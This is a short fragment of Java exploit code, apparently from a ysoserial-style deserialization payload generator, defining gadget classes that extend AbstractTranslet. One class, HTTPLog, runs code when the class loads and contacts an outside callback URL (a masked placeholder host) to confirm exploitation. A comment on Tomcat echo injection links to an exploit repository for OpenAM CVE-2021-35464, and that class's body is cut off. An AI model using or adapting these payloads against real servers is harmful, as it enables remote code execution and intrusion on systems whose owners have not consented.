...
public class GadgetClasses {
    public static class HTTPLog extends AbstractTranslet {
        static {
            try {
                new java.net.URL("http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/".trim()).getContent();
    ...
    // Tomcat 回显
    // https://github.com/Y4er/openam-CVE-2021-35464/blob/main/src/ysoserial/payloads/TomcatEchoInject.java
    public static class TomcatEchoInject extends AbstractTranslet {
